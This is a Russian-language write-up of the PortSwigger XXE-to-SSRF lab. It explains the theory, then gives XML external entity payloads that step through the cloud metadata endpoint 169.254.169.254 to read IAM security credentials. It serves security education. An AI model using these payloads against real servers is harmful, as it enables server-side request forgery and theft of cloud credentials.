# Exploiting XXE to perform SSRF attacks

## Theory

<h3>Эксплуатация XXE для проведения SSRF-атак</h3>

Помимо извлечения конфиденциальных данных, другим основным воздействием атак XXE является то, что они могут использоваться для выполнения подделки запросов на стороне сервера (SSRF). Это потенциально серьезная уязвимость, из-за которой серверное приложение может выполнять HTTP-запросы к любому URL-адресу, к которому может получить доступ сервер.

Чтобы использовать уязвимость XXE для выполнения атаки SSRF, вам необходимо определить внешний XML-объект с помощью URL-адреса, на который вы хотите нацелиться, и использовать определенный объект в значении данных. Если вы можете использовать определенный объект в значении данных, возвращаемом в ответе приложения, вы сможете просмотреть ответ от URL-адреса в ответе приложения и, таким образом, получить двустороннее взаимодействие с серверной системой. Если нет, то вы сможете выполнять только слепые SSRF-атаки (которые все еще могут иметь критические последствия).

В следующем примере XXE внешний объект заставит сервер сделать внутренний HTTP-запрос к внутренней системе в инфраструктуре организации:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/4.png)

Модифицируем запрос. Код экплоита:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/5.png)

Теперь мы последовательно будем добавлять новые значения, для дальшейнего узучения API. Код экплоита:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/6.png)

Таким образом, мы доходим до файла, из которого мы можем прочесть данные. Код эксплоита:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/7.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_perform_SSRF_attacks/assets/8.png)
